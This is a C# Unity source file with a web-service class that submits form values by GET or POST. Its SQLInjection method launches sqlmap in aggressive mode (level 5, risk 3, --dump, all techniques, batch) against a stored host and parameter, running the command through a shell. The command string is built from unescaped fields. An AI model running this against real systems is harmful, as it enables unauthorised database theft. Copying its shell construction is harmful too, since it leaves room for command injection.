using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using UnityEngine;

namespace Service
{
    public class InputWebService : WebService
    {
        private readonly string _url;
        private readonly Utils.WebMethod _method;
        private readonly string _param;
        private readonly Dictionary<string, string> _postParams;

        public InputWebService(string vhost, string ip, int port, string url, Utils.WebMethod method, string param,
            Dictionary<string, string> postParameters = null) : base(vhost, ip, port)
        {
            _url = url;
            _method = method;
            _param = param;
            _postParams = postParameters;
        }

        public async Task<string> Submit(string value)
        {
            switch (_method)
            {
                case (Utils.WebMethod.GET):
                    string s = $"{_param}={value}";
                    string separator = _url.Contains("?") ? "&" : "?";
                    return await Get(_url + separator + s);

                case (Utils.WebMethod.POST):
                    Dictionary<string, string> toSend = new Dictionary<string, string>();
                    foreach (KeyValuePair<string, string> pair in _postParams)
                    {
                        toSend.Add(pair.Key, pair.Value);
                    }

                    toSend.Add(_param, value);
                    return await Post(_url, content: toSend);

                default:
                    throw new NotImplementedException($"The method {_method} is not yet implemented.");
            }
        }

        public void SQLInjection()
        {
            Thread thread = new Thread(ThreadedSQLInjection);
            thread.Start();
            //thread.Join();
        }

        public void ThreadedSQLInjection()
        {
            //TODO: Add support for POST method
            string sqlmap = Path.Combine("Binaries", "sqlmap", "sqlmap.py");
            string outputdir = Path.Combine("Results", GetIP().ToString(), GetPort().ToString());
            string options = $"--level=5 --risk=3 --dump --technique=BEQSU --batch -o --output-dir={outputdir}";
            string command = $"{sqlmap} {options} -u \"{GetIP()}:{GetPort()}/{_url}?{_param}=*\"";

            Debug.Log(command);
            command.Exec();
        }
    }
}